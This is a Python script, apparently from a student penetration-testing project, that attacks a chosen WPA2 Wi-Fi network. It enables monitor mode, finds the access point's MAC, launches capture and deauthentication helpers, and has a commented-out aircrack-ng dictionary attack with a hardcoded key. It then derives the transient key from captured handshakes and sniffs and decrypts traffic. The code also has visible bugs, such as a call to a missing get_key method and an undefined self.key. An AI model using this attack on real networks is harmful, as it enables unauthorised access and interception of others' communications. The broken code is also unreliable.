import sys
import os
import os.path
from scapy.all import *
import subprocess as sub
import WPA2
from binascii import *
import handshake


class sniffer():
    def __init__(self):
        self.dfilepath = str(sub.run("pwd", capture_output=True).stdout)[2:-3]

        start = input("First time starting up? [Y/N]:")

        if start == "Y" or start == "y":
            # put everything in monitor mode when starting up
            print("Killing services")
            os.system("sudo airmon-ng check kill")
            print("Starting wlan1mon")
            os.system("sudo airmon-ng start wlan1 1")
            print("Done")

        print("Which wifi do you want to crack")

        self.wifi = input("Wifi name: ")
        self.find_mac()

    def find_mac(self):
        print("Finding Mac-Adress")

        os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >".format(self.wifi) + self.dfilepath + "/output.txt")

        wifi_list = open(self.dfilepath + "/output.txt", 'r').read()
        index = wifi_list.index("Address")

        self.mac = wifi_list[index + len("Address: "):index + len("Address: ") + 17]
        self.get_key()

    def get_master_key(self):
        # code for cracking the key
        # find key using the iv's in .cap file
        if not os.path.isfile(self.dfilepath + "/WPA_{}-01.cap".format(self.mac)):
            self.make_cap()

        print("Cracking the key")
        #		os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + "/home/kali/rockyou.txt>" + self.dfilepath + "/key_info.txt")
        #		key_file = open(self.dfilepath + "/key_info.txt", "r").read()
        #		index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
        self.master_key = "123456781234567f"

        #		while key_file[index] != ' ':
        #			self.master_key += key_file[index]
        #			index += 1

        print("Key has been found: {}".format(self.master_key))
        print("Starting to sniff")

        self.get_transient_key()

    def condense_mac(self, mac):
        condensed_mac = ""
        for i in range(len(mac)):
            if ((i+1) % 3) != 0:
                condensed_mac += mac[i]
        return condensed_mac

    def get_transient_key(self):

        password = self.master_key
        ssid = self.wifi
        capfile = rdpcap(self.dfilepath + "/WPA_{}-01.cap".format(self.mac))
        handshakes = []
        for i in capfile:
            if i.haslayer(EAPOL):
                handshakes.append(i)

        if len(handshakes) > 4:
            handshakes = handshake.handshake_sorter(handshakes)
            if len(handshakes) == 0:
                print('no complete handshake')
        elif len(handshakes) < 4:
            print('no complete handshake')
        else:
            if bytes_hex(handshakes[0][Raw]).decode('utf-8')[154:186] != '0' * 32:
                print('no complete handshake')

        load1 = hexlify(bytes(handshakes[0][EAPOL][Raw])).decode('utf-8')
        load2 = hexlify(bytes(handshakes[1][EAPOL][Raw])).decode('utf-8')

        assert self.mac == handshakes[0].addr2
        mac_ap = a2b_hex(self.condense_mac(self.mac))
        mac_cl = a2b_hex(self.condense_mac(handshake[0].addr1))

        anonce = a2b_hex(load1[26:90])
        snonce = a2b_hex(load2[26:90])

        PKE = "Pairwise key expansion"  # Standard Set Value so we don't know what it is
        PMK = handshake.pmk_generation(password, ssid)
        key_data = str(min(mac_ap, mac_cl) + max(mac_ap, mac_cl) + min(anonce, snonce) + max(anonce, snonce))
        PTK = handshake.ptk_generation(PMK, PKE, key_data)

        self.transient_key = PTK

        self.sniff_packets()

    def decrypt(self, packet):
        self.key = WPA2.key_to_matrix(self.key)
        nb_cols = len(self.key[0])

        rounds = 0

        if nb_cols == 4:
            rounds = 10
        elif nb_cols == 6:
            rounds = 12
        elif nb_cols == 8:
            rounds = 14

        encrypted_mess = hexlify(str(packet))
        unencrypted_mess = WPA2.decrypt_wpa2_data(encrypted_mess, self.key, rounds)
        #		unencrypted_mess = self.filter_packets(unencrypted_mess)

        return unencrypted_mess

    def filtersniff(self, packet):
        if packet.haslayer(Dot11Beacon):
            if packet[Dot11Beacon].network_stats()["ssid"] == "4B1":
                return packet

    def sniff_packets(self):
        sniff(iface="wlan1mon", lfilter=self.filtersniff, prn=self.decrypt)

    def filter_packets(self, message):
        alfabet = [chr(elem) for elem in range(48, 123)]
        filtered_message = ""

        for elem in message:
            if elem == " ":
                filtered_message += " "
            if elem in alfabet or elem.isdigit():
                filtered_message += elem
            else:
                continue

        if len(filtered_message) < 5:
            return ''

        return filtered_message

    def make_cap(self):
        process2 = sub.Popen(["xterm", "-e",
                              "sudo python3 " + self.dfilepath + "/PenO3-Kali/WPA2/AirodumpWPA2.py {} {}".format(
                                  self.mac, self.dfilepath)])
        process1 = sub.Popen(
            ["xterm", "-e", "sudo python3 " + self.dfilepath + "/PenO3-Kali/WPA2/AireplayWPA2.py {}".format(self.mac)])
        process1.wait()
        process2.wait()


sniffer()
